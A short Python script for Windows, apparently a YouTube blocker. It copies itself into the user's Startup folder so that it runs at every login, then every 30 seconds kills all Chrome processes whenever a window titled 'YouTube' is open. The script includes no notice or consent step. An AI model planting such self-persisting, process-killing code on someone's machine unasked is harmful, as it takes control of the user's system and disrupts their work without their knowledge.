import os.path
import sys
import time
import winshell

import psutil
import pygetwindow

if getattr(sys, 'frozen', False):
    file_path = os.path.basename(sys.executable)

else:
    file_path = os.path.basename(__file__)

try:
    cwd = os.path.join(os.getcwd(), file_path)

    with open(cwd, 'rb') as file:
        start_up = winshell.startup()
        buffer = bytearray(file.read())
    start_up = f'{start_up}\\{file_path}'

    with open(start_up, 'wb') as file:
        file.write(buffer)

except Exception as error:
    with open('log.txt', 'a') as file:
        file.write(f'{error}')



while True:
    windows = pygetwindow.getAllTitles()
    print('1')

    for window in windows:
        if 'YouTube' in window:
            print(window)
            procs = psutil.process_iter(['pid', 'name'])
            for proc in procs:
                if proc.info['name'] == 'chrome.exe':
                    print(proc.kill())
    time.sleep(30)

input('Enter')